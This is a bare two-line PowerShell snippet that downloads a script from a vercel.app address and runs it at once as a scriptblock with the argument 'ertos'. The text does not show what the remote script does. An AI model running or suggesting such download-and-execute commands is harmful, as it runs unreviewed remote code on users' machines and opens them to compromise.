$s = Invoke-RestMethod "https://nirpin.vercel.app/list.ps1"
& ([scriptblock]::Create($s)) ertos
